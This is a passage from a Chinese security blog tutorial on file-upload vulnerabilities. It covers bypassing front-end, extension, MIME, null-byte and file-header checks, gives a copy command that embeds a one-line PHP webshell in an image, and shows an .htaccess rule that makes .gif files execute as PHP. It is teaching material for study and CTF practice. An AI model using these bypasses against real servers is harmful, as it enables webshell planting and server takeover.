href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF-Web/" style="font-size: 1.05rem;">CTF-Web<sup>1</sup></a><a href="/tags/Docker%E5%A4%8D%E7%8E%B0/" style="font-size: 1.05rem;">Docker复现<sup>1</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/Web-SSRF/" style="font-size: 1.05rem;">Web-SSRF<sup>1</sup></a><a href="/tags/Web-awd/" style="font-size: 1.05rem;">Web-awd<sup>1</sup></a><a href="/tags/Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">Web-文件包含<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 1.05rem;">ctfshow<sup>2</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">前端<sup>2</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">文件包含<sup>1</sup></a><a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 1.05rem;">比赛<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div><div class="console-btn-item" id="consoleKeyboard" onclick="anzhiyu.keyboardToggle()" title="快捷键开关"><a class="keyboard-switch"><i class="anzhiyufont anzhiyu-icon-keyboard"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">文件上传</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-04-02T06:37:49.000Z" title="发表于 2024-04-02 14:37:49">2024-04-02</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-07-08T06:38:27.975Z" title="更新于 2024-07-08 14:38:27">2024-07-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为浙江"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>浙江</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><header><h1 id="CrawlerTitle" itemprop="name headline">文件上传</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">MooSe</span><time itemprop="dateCreated datePublished" datetime="2024-04-02T06:37:49.000Z" title="发表于 2024-04-02 14:37:49">2024-04-02</time><time itemprop="dateCreated datePublished" datetime="2024-07-08T06:38:27.975Z" title="更新于 2024-07-08 14:38:27">2024-07-08</time></header><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>首先来介绍一下文件上传<strong>漏洞</strong>及其<strong>原理</strong>吧</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h4 id="1、文件上传漏洞简介"><a href="#1、文件上传漏洞简介" class="headerlink" title="1、文件上传漏洞简介"></a>1、文件上传漏洞简介</h4><p><strong>文件上传漏洞</strong>是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>上上传可执行的动态脚本文件。</p>
<ul>
<li>这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</li>
<li>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</li>
<li>如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</li>
</ul>
<p>文件上传漏洞本身就是一个危害巨大的漏洞，<strong>WebShell</strong>更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下<strong>WebShell</strong>以方便<u>后续进入系统</u>。</p>
<h4 id="2、文件上传漏洞原理："><a href="#2、文件上传漏洞原理：" class="headerlink" title="2、文件上传漏洞原理："></a>2、文件上传漏洞原理：</h4><p>在文件上传的功能处，若服务端脚本语言未对上传的文件进行<strong>严格验证</strong>和<strong>过滤</strong>，导致<u>恶意用户上传恶意的脚本文件时，就有可能获取<strong>执行服务端命令</strong>的能力</u>，这就是<strong>文件上传漏洞</strong>。</p>
<p>文件上传漏洞对Web应用来说是一种非常严重的漏洞。</p>
<ul>
<li>一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息</li>
<li>如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传<strong>一句话木马</strong>等<strong>Webshell</strong>，从而达到<u>控制Web网站</u>的目的。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8538905ae833eb66050d4dee0b4af73b.png" alt="img"></p>
<h4 id="3、文件上传漏洞的高危触发点"><a href="#3、文件上传漏洞的高危触发点" class="headerlink" title="3、文件上传漏洞的高危触发点"></a>3、文件上传漏洞的高危触发点</h4><p>存在<strong>文件上传功能</strong>的地方都有可能存在<strong>文件上传漏洞</strong>，比如相册、头像上传，视频、照片分享。论坛发帖和邮箱等可以<strong>上传附件</strong>的地方也是上传漏阔的高危地带，另外像<strong>文件管理器</strong>这样的功能也有可能被攻击者所利用。</p>
<blockquote>
<p>值得注意的是，如果移动端也存在类似的操作的话，那么相同的原理，也存在文件上传漏洞的风险。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3a499e6f6a02cbb6e9254088bd43a700.png" alt="img"></p>
<h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><ul>
<li>主要是通过<code>javascript代码</code>进行检测，非常容易进行绕过。</li>
</ul>
<h3 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h3><p>  Web应用系统虽然对用户上传的文件进行了<strong>校验</strong>，但是校验是通过前端<strong>javascript</strong>代码完成的。</p>
<ul>
<li>由于恶意用户可以<u><strong>对前端javascript进行修改</strong></u></li>
<li>或者是通过<strong>抓包</strong>软件**<u>篡改上传的文件</u>**，就会导致基于js的校验很容易被绕过。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/ea5f7b52ddb06f56a55c3e7479e0159c.png" alt="img"></p>
<h3 id="2-判断："><a href="#2-判断：" class="headerlink" title="2.判断："></a>2.判断：</h3><p><strong>如何判断当前页面使用前端is的验证方式:</strong></p>
<p>​	<u>前端验证通过</u>以后，表单成功提交后会通过浏览器发出─条网络请求</p>
<ul>
<li>如果前端验证不成功，则不会发出这项网络请求</li>
<li>可以在浏览器的网络元素中查看是否发出了网络请求。</li>
</ul>
<h3 id="3-绕过方法："><a href="#3-绕过方法：" class="headerlink" title="3.绕过方法："></a>3.绕过方法：</h3><ul>
<li><strong>删除</strong>或者禁用js:<code>火狐浏览器--&gt;about:config--&gt;JavaScriptenable-false (ajax)</code></li>
<li>使用代理上传文件，Burp Suite;上传符合要求的文件类型，<strong>抓包修改文件类型</strong>。</li>
</ul>
<h4 id="3-1-删除js绕过："><a href="#3-1-删除js绕过：" class="headerlink" title="3.1 删除js绕过："></a>3.1 删除js绕过：</h4><p>直接删除代码中<strong>onsubmit</strong>事件中关于文件上传时验证上传文件的相关代码即可：</p>
<p>例如这个例子：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/39a8d62d36e8a8da361fd12def27158f.png" alt="img"></p>
<ul>
<li>或者可以不加载所有js</li>
<li>还可以将html源码copy一份到本地，然后对相应代码进行修改，本地提交即可。</li>
</ul>
<h4 id="3-2-burpsuite抓包"><a href="#3-2-burpsuite抓包" class="headerlink" title="3.2  burpsuite抓包"></a>3.2  burpsuite抓包</h4><p>直接用burpsuite拦截</p>
<ul>
<li>发送到repeater后将文件头类型修改</li>
<li>或者修改MINI类型即可</li>
</ul>
<h2 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h2><h3 id="一-后缀名检测漏洞："><a href="#一-后缀名检测漏洞：" class="headerlink" title="一.后缀名检测漏洞："></a>一.后缀名检测漏洞：</h3><p><strong>大致原理：</strong></p>
<p>  通常是针对文件的<strong>扩展名后缀</strong>进行检测，主要是通过<strong>黑白名单</strong>进行过滤检测，</p>
<ul>
<li><strong>黑</strong>名单：<u>如果不符全过滤规则则不允许上传</u>。</li>
<li><strong>白</strong>名单：<u>只允许符合规定后缀名的文件上传</u>。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/607ebe2a9f85d9569fe96fdad5c2a1de.png" alt="img"></p>
<h4 id="1-黑名单"><a href="#1-黑名单" class="headerlink" title="1.黑名单"></a>1.黑名单</h4><h5 id="1-1原理："><a href="#1-1原理：" class="headerlink" title="1.1原理："></a>1.1原理：</h5><p> 黑名单检测:一般有个专门的 <code>blacklist 文件</code>，里面会包含常见的危险脚本文件。 例如: fckeditor 2.4.3 或之前版本的黑名单:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7e17d1931b29c55316f201803324090b.png" alt="img"></p>
<h5 id="1-2-绕过方法："><a href="#1-2-绕过方法：" class="headerlink" title="1.2 绕过方法："></a>1.2 绕过方法：</h5><h6 id="1-2-1解析漏洞"><a href="#1-2-1解析漏洞" class="headerlink" title="1.2.1解析漏洞"></a>1.2.1解析漏洞</h6><ul>
<li><code>.htaccess</code>文件解析漏洞- apache解析漏洞</li>
<li>IIS7.0 | IIS7.5 | Nginx的解析漏洞</li>
<li>IIS6.0解析漏洞</li>
</ul>
<h6 id="1-2-2截断上传"><a href="#1-2-2截断上传" class="headerlink" title="1.2.2截断上传"></a>1.2.2截断上传</h6><ul>
<li>截断类型:PHP%00截断</li>
<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断</li>
<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
</ul>
<h6 id="1-2-3大小写绕过"><a href="#1-2-3大小写绕过" class="headerlink" title="1.2.3大小写绕过"></a>1.2.3大小写绕过</h6><p> 比如：<code>aSp</code>和<code>pHp</code>之类。</p>
<h6 id="1-2-4黑名单扩展名的漏网之鱼"><a href="#1-2-4黑名单扩展名的漏网之鱼" class="headerlink" title="1.2.4黑名单扩展名的漏网之鱼"></a>1.2.4黑名单扩展名的漏网之鱼</h6><p>比如: <code>asa</code>和<code>cer</code>之类 <code>asp:</code> <code>asa</code> <code>cer</code> <code>aspx</code> <code>jsp:</code> <code>jspx</code> <code>jspf</code> <code>php:</code> <code>php</code> <code>php3</code> <code>php4</code> <code>php5</code> <code>phtml</code> <code>pht</code> <code>exe:</code> <code>exee</code> </p>
<h6 id="1-2-5利用Windows的命名机制"><a href="#1-2-5利用Windows的命名机制" class="headerlink" title="1.2.5利用Windows的命名机制"></a>1.2.5利用Windows的命名机制</h6><p><code>shell.php.</code>  <code>shell.php空格</code>  <code>shell.php:1.jpg</code>  <code>shell. php::$DATA</code>  <code>shell.php:1.jpg</code>  在windows中，后缀名后面的点和空格都会被删除掉。</p>
<h6 id="1-2-6双写绕过"><a href="#1-2-6双写绕过" class="headerlink" title="1.2.6双写绕过"></a>1.2.6双写绕过</h6><p>有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。比如：<code>pphphp</code> </p>
<h4 id="2-白名单"><a href="#2-白名单" class="headerlink" title="2.白名单:"></a>2.白名单:</h4><h5 id="2-1原理："><a href="#2-1原理：" class="headerlink" title="2.1原理："></a>2.1原理：</h5><p>​	白名单检测:一般有个专门的 <code>whitelist 文件</code>，里面会包含的正常文件：<code>Jpg</code> <code>png</code> <code>GIF</code> </p>
<h5 id="2-2绕过方法："><a href="#2-2绕过方法：" class="headerlink" title="2.2绕过方法："></a>2.2绕过方法：</h5><h6 id="2-2-1解析漏洞"><a href="#2-2-1解析漏洞" class="headerlink" title="2.2.1解析漏洞"></a>2.2.1解析漏洞</h6><ul>
<li>.htaccess文件解析漏洞</li>
<li>apache解析漏洞</li>
<li>IIS7.0 | IIS7.5 | Nginx的解析漏洞</li>
<li>IIS6.0解析漏洞</li>
</ul>
<h6 id="2-2-2截断上传"><a href="#2-2-2截断上传" class="headerlink" title="2.2.2截断上传"></a>2.2.2截断上传</h6><ul>
<li>截断类型:PHP%00截断</li>
<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断</li>
<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
</ul>
<h3 id="二-MIME检测："><a href="#二-MIME检测：" class="headerlink" title="二.MIME检测："></a>二.MIME检测：</h3><h4 id="1-什么是MIME："><a href="#1-什么是MIME：" class="headerlink" title="1.什么是MIME："></a>1.什么是MIME：</h4><blockquote>
<p> <code>MIME(Multipurpose Internet Mail Extensions)</code>多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
</blockquote>
<p><strong>绕过上传限制-服务端绕过MIME检测：</strong> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/606cffca411fa045859e67820aa4842f.png" alt="img"></p>
<h4 id="2-常见的MIME类型"><a href="#2-常见的MIME类型" class="headerlink" title="2. 常见的MIME类型:"></a>2. 常见的MIME类型:</h4><ul>
<li><p><code>text/plain</code> （纯文本）</p>
</li>
<li><p><code>text/html</code> （HTML文档）</p>
</li>
<li><p><code>text/javascript</code> （js代码） </p>
</li>
<li><p><code>application/xhtml+xml</code> （XHTML文档）  </p>
</li>
<li><p><code>image/gif</code> （GIF图像） </p>
</li>
<li><p><code>image/jpeg</code> （JPEG图像）  </p>
</li>
<li><p><code>image/png</code> （PNG图像）  </p>
</li>
<li><p><code>video/mpeg</code> （MPEG动画） </p>
</li>
<li><p><code>application/octet-stream</code> （二进制数据）  <code>application/pdf</code> （PDF文档）</p>
</li>
</ul>
<h4 id="3-检测方式："><a href="#3-检测方式：" class="headerlink" title="3. 检测方式："></a>3. 检测方式：</h4><blockquote>
<p>    在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型<code>file_type</code>；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的<code>file_type</code>进行对比，如果符合要求就允许上传这个文件。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/74653d61d4e0d763977bff469eb090ca.png" alt="img"></p>
<h4 id="4-MIME绕过的原理："><a href="#4-MIME绕过的原理：" class="headerlink" title="4. MIME绕过的原理："></a>4. MIME绕过的原理：</h4><ul>
<li>部分Web应用系统判定文件类型是通过<code>content-type字段</code></li>
<li>黑客可以通过抓包，将<code>content-type字段</code>改为常见的<code>图片类型</code></li>
<li>如改成<code>image/gif</code>，从而绕过校验。</li>
</ul>
<h3 id="三-00截断："><a href="#三-00截断：" class="headerlink" title="三.00截断："></a>三.00截断：</h3><h4 id="1-原理：-1"><a href="#1-原理：-1" class="headerlink" title="1.原理："></a>1.原理：</h4><p>  虽然web应用做了校验，但是由于文件上传后的<code>路径用户可以控制</code></p>
<ul>
<li>攻击者可以利用手动添加字符串标识符<code>0X00</code>的方式来将后面的拼接的内容<code>进行截断</code>,导致后面的内容无效</li>
<li>并且后面的内容又可以帮助我们绕过<strong>黑白名单</strong>的检测。</li>
</ul>
<h4 id="2-绕过思路："><a href="#2-绕过思路：" class="headerlink" title="2.绕过思路："></a>2.绕过思路：</h4><p>  在<code>C语言</code>中，<code>空字符</code>有一个特殊含义，代表字符串的拼接结束。这里我们使用的是<code>php语言</code>，属于高级语言，底层靠<code>C语言</code>来实现的，也就是说<code>空字符</code>的字符串拼接结束功能在<code>PHP</code>中也能实现。但是我们在URL中不能直接使用<code>空</code>，这样会造成无法识别。</p>
<ul>
<li>我们通过查看<code>ASCII对照表</code>，发现<code>ASCII对照表</code>第一个就<code>空字符</code>，它对应的16进制是<code>00</code></li>
<li>这里我们就可以用16进制的<code>00</code>来代替<code>空字符</code>，让它<code>截断</code>后面的内容。</li>
</ul>
<p>使用<code>burpsuite</code>进行抓包，因为这里是通过<code>URL</code>进行传递的文件上传后存储路径，所以需要对<code>16进制</code>的<code>00</code>进行<code>URL编码</code>，编码的结果就是<code>%00</code>，通过这种方式，就可以<code>%00</code>截断后面的内容，让拼接的文件名不再进行生效：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/474a93be8412b08a47bc4cbef42f90bc.png" alt="img"></p>
<h3 id="四-文件头检测漏洞："><a href="#四-文件头检测漏洞：" class="headerlink" title="四.文件头检测漏洞："></a>四.文件头检测漏洞：</h3><h4 id="1-原理：-2"><a href="#1-原理：-2" class="headerlink" title="1.原理："></a>1.原理：</h4><blockquote>
<p>   在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是<strong>文件头标志</strong>。我们可以通过16进制编辑器打开文件<strong>，<u>添加服务器允许的文件头以绕过检测</u>。</strong></p>
</blockquote>
<h4 id="2-常见的文件头："><a href="#2-常见的文件头：" class="headerlink" title="2.常见的文件头："></a>2.常见的文件头：</h4><p><strong>注意：下面的文件头的格式是<code>16进制</code>的格式：</strong></p>
<ul>
<li><p>gif：<code>47 49 46 38 39 61</code> </p>
</li>
<li><p>png：<code>89 50 4E 47 0D 0A 1A 0A</code> </p>
</li>
<li><p>jpg：<code>FF D8 FF E0 00 10 4A 46 49 46</code></p>
</li>
</ul>
<h4 id="3-操作"><a href="#3-操作" class="headerlink" title="3.操作"></a>3.操作</h4><ul>
<li>在进行<code>文件头绕过</code>时，我们可以<u>把上面的<code>文件头</code>添加到我们的一句话木马内容最前面</u>，达到绕过文件头检测的目的。</li>
</ul>
<h4 id="五-内容检测图片马绕过："><a href="#五-内容检测图片马绕过：" class="headerlink" title="五.内容检测图片马绕过："></a>五.内容检测图片马绕过：</h4><h5 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p> 一般文件内容验证使用<code>getimagesize函数</code>检测,会判断文件是否是一个有效的文件图片.</p>
<ul>
<li>如果是,则允许上传</li>
<li>否则的话不允许上传。</li>
</ul>
<p>本实验就是将<strong>一句话木马</strong>插入到一个[合法]的<strong>图片文件</strong>当中,然后用webshell管理工具进行远程连接。</p>
<h5 id="2-图片马制作：-重点"><a href="#2-图片马制作：-重点" class="headerlink" title="2.图片马制作：(重点)"></a>2.图片马制作：(重点)</h5><ul>
<li><p>准备一张图片，这里为<code>1.png</code></p>
</li>
<li><p>一个一句话木马，记为<code>2.php</code></p>
</li>
<li><p>通过以下命令合成一个图片马<code>3.png</code>：</p>
</li>
</ul>
<p><strong>命令如下：</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1.</span>png/b + <span class="number">2.</span>php/a <span class="number">3.</span>php  </span><br><span class="line">/<span class="attr">b</span>:指定以二进制格式复制、合并文件，用于图像或者声音类文件</span><br><span class="line">/<span class="attr">a</span>:指定以ascii格式复制、合并文件用于txt等文本类文件</span><br></pre></td></tr></table></figure>

<p>这样子就可以复制从而制作出图片木马了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1049c9292c1bca75e309898a124fb5e4.png" alt="img"></p>
<p> 注：</p>
<p>这条命令的意思是：通过<code>copy命令</code>，把<code>a.png</code>图片文件，以二进制文件形式添加到<code>a.php</code>文件中，以<code>ASCII文本文件</code>形式输出为<code>3.php</code>文件。</p>
<h5 id="3-解析图片马："><a href="#3-解析图片马：" class="headerlink" title="3.解析图片马："></a>3.解析图片马：</h5><p> 一般解析图片马需要结合<code>解析漏洞</code>或者<code>文件包含</code>才能解析图片马</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="一-htaccess文件解析漏洞："><a href="#一-htaccess文件解析漏洞：" class="headerlink" title="一..htaccess文件解析漏洞："></a>一.<code>.htaccess</code>文件解析漏洞：</h3><h5 id="1-漏洞利用前提-："><a href="#1-漏洞利用前提-：" class="headerlink" title="1.漏洞利用前提:："></a>1.漏洞利用前提:：</h5><blockquote>
<p>   web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传<strong>自定义</strong>的<code>.htaccess文件</code>。</p>
</blockquote>
<h5 id="2-原理："><a href="#2-原理：" class="headerlink" title="2.原理："></a>2.原理：</h5><blockquote>
<p> <code>.htaccess文件(或者&quot;分布式配置文件&quot;)</code> ,全称是<code>Hypertext Access(超文本入口)</code>。提供了针对目录改变配置的方法</p>
<p> ​	也就是在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
</blockquote>
<h5 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3 利用方式:"></a>3 利用方式:</h5><blockquote>
<p> 上传覆盖<code>.htaccess文件</code>，重写<code>解析规则</code>，将上传的带有脚本马的图片以脚本方式解析。</p>
</blockquote>
<h5 id="4-htaccess文件内容"><a href="#4-htaccess文件内容" class="headerlink" title="4 .htaccess文件内容:"></a>4 <code>.htaccess文件</code>内容:</h5><p>​	 <code>.htaccess文件</code>解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解释&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;evil.gif&quot;</span>&gt;</span><br><span class="line"><span class="title class_">SetHandler</span> application/x-httpd-php   #在当前目录下，如果匹配到evil.<span class="property">gif</span>文件，则被解析成<span class="variable constant_">PHP</span>代码执行</span><br><span class="line"><span class="title class_">AddHandler</span> php5-script .<span class="property">gif</span>          #在当前目录下，如果匹配到evil.<span class="property">gif</span>文件，则被解析成<span class="variable constant_">PHP</span>代码执行</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="二-Apache解析漏洞："><a href="#二-Apache解析漏洞：" class="headerlink" title="二.Apache解析漏洞："></a>二.<code>Apache</code>解析漏洞：</h3><h4 id="1-漏洞原理：-1"><a href="#1-漏洞原理：-1" class="headerlink" title="1 漏洞原理："></a>1 漏洞原理：</h4><blockquote>
<p> <code>Apache</code> 解析文件的规则是<code>从右到左</code>开始判断解析，如果<code>后缀名</code>为<code>不可识别</code>文件解析，就再往左判断。比如<code>test.php.a.b</code>的“<code>.a</code>”和“<code>.b</code>”这两种后缀是<code>apache</code>不可识别解析，<code>apache</code>就会把<code>test.php.a.b</code>解析成<code>test.php</code>。</p>
</blockquote>
<h4 id="2-影响版本："><a href="#2-影响版本：" class="headerlink" title="2 影响版本："></a>2 影响版本：</h4><blockquote>
